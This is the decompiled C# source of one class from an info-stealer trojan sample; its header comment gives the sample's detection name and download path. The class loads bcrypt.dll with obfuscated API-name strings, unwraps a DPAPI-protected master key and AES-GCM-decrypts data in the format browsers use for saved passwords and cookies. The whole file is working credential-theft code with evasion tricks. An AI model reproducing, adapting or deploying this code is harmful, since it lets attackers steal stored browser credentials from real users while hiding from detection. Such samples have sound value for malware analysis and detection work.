// Decompiled with JetBrains decompiler
// Type: SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI
{
  public SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI() => this.LibPtr = SystemNetThreadKindsG.LoadLibrary(Path.Combine(Environment.SystemDirectory, "bcrFileStream.IOypt.dFileStream.IOll".Replace("FileStream.IO", string.Empty)));

  private IntPtr LibPtr { get; }

  public uint D_1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags) => SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D1>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCrstring.EmptyyptOpestring.EmptynAlgorithmProvistring.Emptyder".Replace("string.Empty", string.Empty)))(out phAlgorithm, pszAlgId, pszImplementation, dwFlags);

  public uint D_2(IntPtr hAlgorithm, uint flags) => SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D2>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCruintyptCloseAlgorituinthmProvuintider".Replace("uint", string.Empty)))(hAlgorithm, flags);

  public uint D_3(
    IntPtr hKey,
    byte[] pbInput,
    int cbInput,
    ref SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev pPaddingInfo,
    byte[] pbIV,
    int cbIV,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    int dwFlags)
  {
    return SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D7>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCrUnmanagedTypeyptDecrUnmanagedTypeypt".Replace("UnmanagedType", string.Empty)))(hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
  }

  public uint D_4(IntPtr hKey) => SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D6>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCrbyte[]yptDesbyte[]troyKbyte[]ey".Replace("byte[]", string.Empty)))(hKey);

  public uint D_5(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    uint flags)
  {
    return SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D3>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCpszPropertyryptGepszPropertytPropepszPropertyrty".Replace(nameof (pszProperty), string.Empty)))(hObject, pszProperty, pbOutput, cbOutput, ref pcbResult, flags);
  }

  public uint D_6(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags) => SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D4>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCEncodingryptSEncodingetPrEncodingoperEncodingty".Replace("Encoding", string.Empty)))(hObject, pszProperty, pbInput, cbInput, dwFlags);

  public uint D_7(
    IntPtr hAlgorithm,
    IntPtr hImportKey,
    [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
    out IntPtr phKey,
    IntPtr pbKeyObject,
    int cbKeyObject,
    byte[] pbInput,
    int cbInput,
    uint dwFlags)
  {
    return SystemNetThreadKindsG.Func<SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.D5>(SystemNetThreadKindsG.GetProcAddress(this.LibPtr, "BCrbMasterKeyyptImbMasterKeyportKbMasterKeyey".Replace("bMasterKey", string.Empty)))(hAlgorithm, hImportKey, pszBlobType, out phKey, pbKeyObject, cbKeyObject, pbInput, cbInput, dwFlags);
  }

  public static string Decrypt(byte[] bMasterKey, string chiperText)
  {
    Encoding encoding = Encoding.GetEncoding("windows-1251");
    byte[] numArray = new byte[bMasterKey.Length - 5];
    Array.Copy((Array) bMasterKey, 5, (Array) numArray, 0, bMasterKey.Length - 5);
    byte[] bMasterKey1 = dnlibDotNetPdbDssSymbolWriterImplF.DecryptBlob(numArray, DataProtectionScope.CurrentUser);
    return encoding.GetString(SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI.Decrypt(encoding.GetBytes(chiperText), bMasterKey1));
  }

  private static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
  {
    byte[] numArray1 = new byte[12]
    {
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5,
      (byte) 6,
      (byte) 7,
      (byte) 8,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0
    };
    Array.Copy((Array) bEncryptedData, 3, (Array) numArray1, 0, 12);
    try
    {
      byte[] numArray2 = new byte[bEncryptedData.Length - 15];
      Array.Copy((Array) bEncryptedData, 15, (Array) numArray2, 0, bEncryptedData.Length - 15);
      byte[] numArray3 = new byte[16];
      byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
      Array.Copy((Array) numArray2, numArray2.Length - 16, (Array) numArray3, 0, 16);
      Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, numArray2.Length - numArray3.Length);
      return new SystemNetConfigurationSmtpSpecifiedPickupDirectoryElementInternalI().Get(bMasterKey, numArray1, (byte[]) null, numArray4, numArray3);
    }
    catch (Exception ex)
    {
    }
    return (byte[]) null;
  }

  private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
  {
    IntPtr num1 = this.OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
    IntPtr hKey;
    IntPtr hglobal = this.ImportKey(num1, key, out hKey);
    SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev pPaddingInfo = new SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev(iv, aad, authTag);
    byte[] pbOutput;
    using (pPaddingInfo)
    {
      byte[] pbIV = new byte[this.MaxAuthTagSize(num1)];
      int pcbResult = 0;
      if (this.D_3(hKey, cipherText, cipherText.Length, ref pPaddingInfo, pbIV, pbIV.Length, (byte[]) null, 0, ref pcbResult, 0) != 0U)
        throw new CryptographicException();
      pbOutput = new byte[pcbResult];
      switch (this.D_3(hKey, cipherText, cipherText.Length, ref pPaddingInfo, pbIV, pbIV.Length, pbOutput, pbOutput.Length, ref pcbResult, 0))
      {
        case 3221266434:
          throw new CryptographicException();
        case 0:
          break;
        default:
          throw new CryptographicException();
      }
    }
    int num2 = (int) this.D_4(hKey);
    Marshal.FreeHGlobal(hglobal);
    int num3 = (int) this.D_2(num1, 0U);
    return pbOutput;
  }

  private int MaxAuthTagSize(IntPtr hAlg)
  {
    byte[] property = this.GetProperty(hAlg, "AuthTagLength");
    return BitConverter.ToInt32(new byte[4]
    {
      property[4],
      property[5],
      property[6],
      property[7]
    }, 0);
  }

  private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
  {
    IntPtr phAlgorithm = IntPtr.Zero;
    if (this.D_1(out phAlgorithm, alg, provider, 0U) != 0U)
      throw new CryptographicException();
    byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
    if (this.D_6(phAlgorithm, "ChainingMode", bytes, bytes.Length, 0) != 0U)
      throw new CryptographicException();
    return phAlgorithm;
  }

  private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
  {
    int int32 = BitConverter.ToInt32(this.GetProperty(hAlg, "ObjectLength"), 0);
    IntPtr pbKeyObject = Marshal.AllocHGlobal(int32);
    byte[] pbInput = this.Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
    if (this.D_7(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, pbKeyObject, int32, pbInput, pbInput.Length, 0U) != 0U)
      throw new CryptographicException();
    return pbKeyObject;
  }

  private byte[] GetProperty(IntPtr hAlg, string name)
  {
    int pcbResult = 0;
    if (this.D_5(hAlg, name, (byte[]) null, 0, ref pcbResult, 0U) != 0U)
      throw new CryptographicException();
    byte[] pbOutput = new byte[pcbResult];
    if (this.D_5(hAlg, name, pbOutput, pbOutput.Length, ref pcbResult, 0U) != 0U)
      throw new CryptographicException();
    return pbOutput;
  }

  public byte[] Concat(params byte[][] arrays)
  {
    int num = 0;
    foreach (byte[] array in arrays)
    {
      if (array != null)
        num += array.Length;
    }
    byte[] dst = new byte[num - 1 + 1];
    int dstOffset = 0;
    foreach (byte[] array in arrays)
    {
      if (array != null)
      {
        Buffer.BlockCopy((Array) array, 0, (Array) dst, dstOffset, array.Length);
        dstOffset += array.Length;
      }
    }
    return dst;
  }

  private delegate uint D1(
    out IntPtr phAlgorithm,
    [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
    [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
    uint dwFlags);

  private delegate uint D2(IntPtr hAlgorithm, uint flags);

  private delegate uint D3(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    uint flags);

  private delegate uint D4(
    IntPtr hObject,
    [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
    byte[] pbInput,
    int cbInput,
    int dwFlags);

  private delegate uint D5(
    IntPtr hAlgorithm,
    IntPtr hImportKey,
    [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
    out IntPtr phKey,
    IntPtr pbKeyObject,
    int cbKeyObject,
    byte[] pbInput,
    int cbInput,
    uint dwFlags);

  private delegate uint D6(IntPtr hKey);

  private delegate uint D7(
    IntPtr hKey,
    byte[] pbInput,
    int cbInput,
    ref SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev pPaddingInfo,
    byte[] pbIV,
    int cbIV,
    byte[] pbOutput,
    int cbOutput,
    ref int pcbResult,
    int dwFlags);
}
